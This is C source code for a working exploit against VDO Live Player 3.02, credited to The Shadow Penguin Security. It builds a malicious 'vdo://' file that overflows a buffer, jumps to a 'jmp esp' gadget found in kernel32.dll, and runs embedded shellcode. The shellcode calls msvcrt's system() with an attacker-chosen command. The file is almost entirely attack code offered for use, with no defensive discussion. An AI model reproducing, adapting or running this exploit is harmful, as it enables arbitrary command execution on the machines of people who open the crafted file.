/*====================================================================
   ex_vdolive.c / VDO Live Player 3.02 32bit exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  ===================================================================
*/

#include    <stdio.h>
#include    <string.h>
#include    <windows.h> 

#define     RETADR          90
#define     CODE1_OFS       102
#define     CODE2_OFS       10
#define     MAXBUF1         180
#define     MAXBUF2         1500
#define     JMPESP_1        0xff
#define     JMPESP_2        0xe4
#define     NOP             0x90
#define     KERNEL_NAME     "kernel32.dll"      

unsigned char exploit_jmping[100]={
0x33,0xDB,0x8B,0x41,0x30,0xB3,0xBB,0x03,
0xC3,0xFF,0xE0,0x00};

unsigned char exploit_code[200]={
0xEB,0x4B,0x5B,0x53,0x32,0xE4,0x83,0xC3,
0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
0xBF,0xFF,0xD0,0x8B,0xD0,0x52,0x43,0x53,
0x52,0x32,0xE4,0x83,0xC3,0x06,0x88,0x23,
0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,
0xF0,0x5A,0x43,0x53,0x52,0x32,0xE4,0x83,
0xC3,0x04,0x88,0x23,0xB8,0x28,0x6E,0xF7,
0xBF,0xFF,0xD0,0x8B,0xF8,0x43,0x53,0x83,
0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,
0x33,0xC0,0x50,0xFF,0xD7,0xE8,0xB0,0xFF,
0xFF,0xFF,0x00};
unsigned char cmdbuf[200]="msvcrt.dll.system.exit.";


unsigned int search_mem(unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
    unsigned int    adr;

    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
            adr=(unsigned int)p;
            if ((adr&0xff)==0) continue;
            if (((adr>>8)&0xff)==0) continue;
            if (((adr>>16)&0xff)==0) continue;
            if (((adr>>24)&0xff)==0) continue;
            return(adr);
        }
    return(0);
}

main(int argc,char *argv[])
{
    unsigned int         i,kp,ip,p1,p2;
    static unsigned char buf1[MAXBUF1],buf2[MAXBUF2],*q;
    FILE                 *fp;
    MEMORY_BASIC_INFORMATION meminfo;
        
    if (argc<2){
        printf("usage: %s FileName Command\n",argv[0]);
        exit(1);
    }
    if ((void *)(kp=(unsigned int)LoadLibrary(KERNEL_NAME))==NULL){
        printf("Can not find %s\n",KERNEL_NAME);
        exit(1);
    }

    VirtualQuery((void *)kp,&meminfo,sizeof(MEMORY_BASIC_INFORMATION)); 
    for (i=0;i<meminfo.RegionSize;i++){
        ip=kp+i;
        if ( ( ip     &0xff)==0
          || ((ip>>8 )&0xff)==0
          || ((ip>>16)&0xff)==0
          || ((ip>>24)&0xff)==0) continue;
        q=(unsigned char *)ip;
        if (*q==JMPESP_1 && *(q+1)==JMPESP_2) break;
    }
    if (i==meminfo.RegionSize){
        printf("Can not find codes which are used by this exploit.\n");
        exit(1);
    }

    printf("RETADR  : %x\n",ip);
    memset(buf1,NOP,MAXBUF1-1);
    memset(buf2,NOP,MAXBUF2-1);
    buf1[RETADR  ]=ip&0xff;
    buf1[RETADR+1]=(ip>>8)&0xff;
    buf1[RETADR+2]=(ip>>16)&0xff;
    buf1[RETADR+3]=(ip>>24)&0xff;
    strcat(cmdbuf,argv[2]); 
    strncpy(buf1+CODE1_OFS,exploit_jmping,strlen(exploit_jmping));
    p1=(unsigned int)GetProcAddress((HMODULE)kp,"LoadLibraryA");
    p2=(unsigned int)GetProcAddress((HMODULE)kp,"GetProcAddress");
    printf("LoadLibrary Address    : %x\n",p1);
    printf("GetProcAddress Address : %x\n",p2);

    strcat(exploit_code,cmdbuf);
    exploit_code[0x0d]=p1&0xff;
    exploit_code[0x0e]=(p1>>8)&0xff;
    exploit_code[0x0f]=(p1>>16)&0xff;
    exploit_code[0x10]=(p1>>24)&0xff;
    exploit_code[0x21]=exploit_code[0x35]=p2&0xff;
    exploit_code[0x22]=exploit_code[0x36]=(p2>>8)&0xff;
    exploit_code[0x23]=exploit_code[0x37]=(p2>>16)&0xff;
    exploit_code[0x24]=exploit_code[0x38]=(p2>>24)&0xff;
    exploit_code[0x41]=strlen(argv[2]);

    memcpy(buf2+CODE2_OFS,exploit_code,strlen(exploit_code));

    strncpy(buf1,"vdo://",6);
    buf1[MAXBUF1]=0;
    buf2[MAXBUF2]=0;
    if ((fp=fopen(argv[1],"w"))==NULL){
        printf("Can not create '%s'\n",argv[1]);
        exit(1);
    }
    fprintf(fp,"%s/%s\n",buf1,buf2);
    printf("File '%s' is created.\n",argv[1]);
    return FALSE;
}






